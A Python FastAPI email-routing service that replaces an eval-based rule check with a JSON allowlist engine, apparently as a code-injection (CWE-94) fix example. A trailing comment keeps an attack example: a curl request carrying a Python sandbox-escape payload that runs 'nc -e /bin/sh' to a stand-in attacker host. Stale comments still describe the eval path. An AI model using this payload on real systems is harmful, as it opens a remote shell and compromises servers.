import os
import sqlite3
import logging
import uvicorn
from fastapi import FastAPI, HTTPException, BackgroundTasks
from pydantic import BaseModel
from typing import List, Dict, Any
from datetime import datetime

# Configure logging for the Intelligent Email Routing Gateway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - EmailRouterGateway - %(levelname)s - %(message)s'
)
logger = logging.getLogger("FastAPIEmailRouter")

DB_FILE = "email_routing_audit.db"

app = FastAPI(
    title="Intelligent Email Router API",
    description="Dynamically routes incoming support emails based on custom logic.",
    version="1.0.0"
)

# --- Pydantic Models ---
class EmailMetadata(BaseModel):
    sender: str
    subject: str
    body_snippet: str
    headers: Dict[str, str]
    spam_score: float

class RoutingRule(BaseModel):
    queue_name: str
    condition_script: str

class EmailRouteRequest(BaseModel):
    email: EmailMetadata
    rules: List[RoutingRule]

# --- Database Setup ---
def init_audit_db():
    """Initializes the SQLite database for routing audit logs."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE routing_logs (
            log_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            sender TEXT NOT NULL,
            subject TEXT NOT NULL,
            assigned_queue TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()
    logger.info("Routing audit database initialized.")

def log_routed_email(sender: str, subject: str, queue: str):
    """Persists the routing decision for audit purposes."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO routing_logs (sender, subject, assigned_queue) VALUES (?, ?, ?)''',
            (sender, subject, queue)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log routing decision: {e}")

def evaluate_routing_condition(condition_config_json: str, email_context: EmailMetadata) -> bool:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (eval) with a structured, JSON-based declarative rule engine.
    """
    import json
    
    logger.debug("Evaluating secure routing condition...")
    
    try:
        # Secure: We remove the dangerous eval() function entirely.
        # Executing untrusted strings as Python code from an API payload is a 
        # critical vulnerability. Instead, we implement a declarative approach 
        # where the client submits a JSON object defining the routing logic.
        # Note: The client must be updated to send JSON configuration 
        # (e.g., {"field": "spam_score", "operator": "<", "value": 0.5})
        # rather than raw Python expressions.
        
        rule = json.loads(condition_config_json)
        
        if not isinstance(rule, dict):
            logger.warning("Routing condition must be a valid JSON object.")
            return False
            
        field = rule.get("field")
        operator = rule.get("operator")
        expected_value = rule.get("value")
        
        email_dict = email_context.dict()
        
        if field not in email_dict:
            logger.warning(f"Routing field '{field}' not found in email metadata.")
            return False
            
        actual_value = email_dict.get(field)
        
        # Explicit allowlist of supported safe evaluation operators
        if operator == "==":
            return actual_value == expected_value
        elif operator == "!=":
            return actual_value != expected_value
        elif operator == "contains" and isinstance(actual_value, str) and isinstance(expected_value, str):
            return expected_value.lower() in actual_value.lower()
        elif operator == ">" and isinstance(actual_value, (int, float)) and isinstance(expected_value, (int, float)):
            return actual_value > expected_value
        elif operator == "<" and isinstance(actual_value, (int, float)) and isinstance(expected_value, (int, float)):
            return actual_value < expected_value
        else:
            logger.warning(f"Ignored unknown, unauthorized, or type-mismatched operator: '{operator}'")
            return False
            
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse routing condition as JSON: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error evaluating secure routing condition: {e}")
        return False

# --- API Endpoints ---
@app.post("/api/v1/route", status_code=200)
async def process_email_routing(payload: EmailRouteRequest, background_tasks: BackgroundTasks):
    """
    Evaluates an incoming email against a list of dynamic rules to find the appropriate queue.
    """
    logger.info(f"Processing routing request for email from: {payload.email.sender}")
    
    assigned_queue = "default_unassigned_queue"
    
    for rule in payload.rules:
        # Pass the untrusted string directly to the vulnerable function
        if evaluate_routing_condition(rule.condition_script, payload.email):
            assigned_queue = rule.queue_name
            break
            
    # Asynchronously log the routing decision to avoid blocking the HTTP response
    background_tasks.add_task(log_routed_email, payload.email.sender, payload.email.subject, assigned_queue)
    
    logger.info(f"Email successfully routed to: {assigned_queue}")
    
    return {
        "status": "success",
        "sender": payload.email.sender,
        "routed_to": assigned_queue
    }

@app.get("/api/v1/health")
async def health_check():
    """Standard health check endpoint."""
    return {"status": "FastAPI Email Router is fully operational"}

if __name__ == "__main__":
    init_audit_db()
    
    # Example Malicious Trigger:
    # 1. Attacker sends an HTTP POST request to the /api/v1/route endpoint with a malicious payload.
    # 2. The payload contains a Python script crafted to break out of the sandbox via object traversal:
    #
    # curl -X 'POST' \
    #   'http://127.0.0.1:8000/api/v1/route' \
    #   -H 'accept: application/json' \
    #   -H 'Content-Type: application/json' \
    #   -d '{
    #   "email": {
    #     "sender": "attacker@example.com",
    #     "subject": "System Support",
    #     "body_snippet": "Help me!",
    #     "headers": {},
    #     "spam_score": 0.1
    #   },
    #   "rules": [
    #     {
    #       "queue_name": "exploited_queue",
    #       "condition_script": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == \"catch_warnings\"][0]()._module.__builtins__[\"__import__\"](\"os\").system(\"nc -e /bin/sh attacker.com 4444\") == 0"
    #     }
    #   ]
    # }'
    #
    # 3. The FastAPI router parses the JSON using Pydantic, passes the malicious string 
    #    to eval(), and unknowingly executes the OS command, resulting in complete server compromise.

    logger.info("Starting Uvicorn server on http://0.0.0.0:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="info")
